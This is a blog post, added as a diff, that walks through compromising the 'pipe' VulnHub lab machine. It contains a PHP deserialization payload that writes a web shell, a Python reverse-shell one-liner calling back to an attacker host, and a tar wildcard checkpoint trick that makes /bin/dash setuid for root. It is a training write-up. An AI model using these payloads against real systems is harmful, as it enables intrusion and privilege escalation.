@@ -1,0 +1,211 @@
+---
+layout: post
+title: "pipe"
+date: 2016-08-23 1:31:51 -0500
+comments: true
+categories: [vulhub, tar wildcard, php serialization]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+* Burp
+
+###Vulnerabilities:
+
+[Tar arbitrary command execution](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.41.0/24`
+{% img  /images/blog/vulhub/pipe/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.41.163 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.41.163 -p-`
+
+{% img  /images/blog/vulhub/pipe/Selection_002.png   [title manually exploit [alt text]] %}
+
+there are 4 ports are opening
+
+use nikto to scan
+
+`nikto -h 192.168.41.162`	
+
+{% img  /images/blog/vulhub/pipe/Selection_005.png   [title manually exploit [alt text]] %}
+
+shows there is an `index.php` but needs autherication
+
+{% img  /images/blog/vulhub/pipe/Selection_003.png   [title manually exploit [alt text]] %}
+
+
+use wfuzz to scan
+
+`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  --hc 401 http://192.168.41.163/FUZZ 2>/dev/null`
+
+get a path `scriptz`
+
+{% img  /images/blog/vulhub/pipe/Selection_004.png   [title manually exploit [alt text]] %}
+
+find a file `log.php.BAK`, looks like backup file of log.php
+
+```php
+<?php
+class Log
+{
+    public $filename = '';
+    public $data = '';
+
+    public function __construct()
+    {
+        $this->filename = '';
+        $this->data = '';
+    }
+
+    public function PrintLog()
+    {
+        $pre = "[LOG]";
+        $now = date('Y-m-d H:i:s');
+
+        $str = '$pre - $now - $this->data';
+        eval("\$str = \"$str\";");
+        echo $str;
+    }
+
+    public function __destruct()
+    {
+        file_put_contents($this->filename, $this->data, FILE_APPEND);
+    }
+}
+?>
+```
+
+in order to check if the authentication can be bypassed, I use `http method tamper`.
+
+`nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/index.php}' 192.168.41.163`
+
+{% img  /images/blog/vulhub/pipe/Selection_006.png   [title manually exploit [alt text]] %}
+
+It's vulnerable to POST method.
+
+Use Burp to change GET request to /index.php to POST request, and get the page:
+
+{% img  /images/blog/vulhub/pipe/Selection_007.png   [title manually exploit [alt text]] %}
+
+check the source code:
+
+{% img  /images/blog/vulhub/pipe/Selection_008.png   [title manually exploit [alt text]] %}
+
+The page will load `scriptz/php.js`, and it serialises some data. Based on the log.php.BAK code,
+
+click link `Show Artist Info`, get the url, after decoding:
+
+`O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}`
+
+The “Info” function looks like a way to read information from a specific file. Recheck the log.php.BAK file, find it use `file_put_contents($this->filename, $this->data, FILE_APPEND)` to write data to a file.
+
+Test if it can write to a Log file
+
+`param=O:3:"Log":2:{s:8:"filename";s:8:"Test.txt";s:4:"data";s:4:"TEST";}`
+
+doesn't work
+
+`param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Test.txt";s:4:"data";s:4:"TEST";}`
+
+works
+
+
+based on that, build payload:
+
+`param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" <?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>";}`
+
+
+replace the parameter in Burp. forward the traffic
+
+
+{% img  /images/blog/vulhub/pipe/Selection_010.png   [title manually exploit [alt text]] %}
+
+then:
+
+{% img  /images/blog/vulhub/pipe/Selection_009.png   [title manually exploit [alt text]] %}
+
+webshell is there.
+
+setup backdoor:
+
+`http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+get the shell:
+
+{% img  /images/blog/vulhub/pipe/Selection_011.png   [title manually exploit [alt text]] %}
+
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+
+try to find linux kernel local exploit, but I find there is no gcc in the box.
+
+keep looking.
+
+
+find 
+
+{% img  /images/blog/vulhub/pipe/Selection_012.png   [title manually exploit [alt text]] %}
+
+
+Looks like system does backup automatically. check `/etc/crontab`
+
+
+{% img  /images/blog/vulhub/pipe/Selection_013.png   [title manually exploit [alt text]] %}
+
+`/usr/bin/compress.sh` can be read
+
+I find the tar uses wild card. Here I will try Tar arbitrary command execution.
+
+{% img  /images/blog/vulhub/pipe/Selection_014.png   [title manually exploit [alt text]] %}
+
+first check which shell is being use in target
+
+`ls -al /bin/*sh`
+
+
+{% img  /images/blog/vulhub/pipe/Selection_017.png   [title manually exploit [alt text]] %}
+
+start to create shell:
+
+```
+www-data@pipe:/home/rene/backup$ echo > --checkpoint=1;                    
+www-data@pipe:/home/rene/backup$ echo > --checkpoint-action=exec=sh\ shell.sh;                     
+www-data@pipe:/home/rene/backup$ echo 'chmod u+s /bin/dash' > shell.sh
+www-data@pipe:/home/rene/backup$ echo 'touch /home/rene/backup/done' >> shell.sh                     
+www-data@pipe:/home/rene/backup$ cat shell.sh
+chmod u+s /bin/dash
+touch /home/rene/backup/done
+www-data@pipe:/home/rene/backup$ chmod +x shell.sh
+
+```
+
+just wait a few miniutes and a file `done` will be created
+
+
+{% img  /images/blog/vulhub/pipe/Selection_015.png   [title manually exploit [alt text]] %}
+
+
+run `/bin/dash` and get the shell
+
+{% img  /images/blog/vulhub/pipe/Selection_016.png   [title manually exploit [alt text]] %}
+
+
+
+
+
+
+
+
+
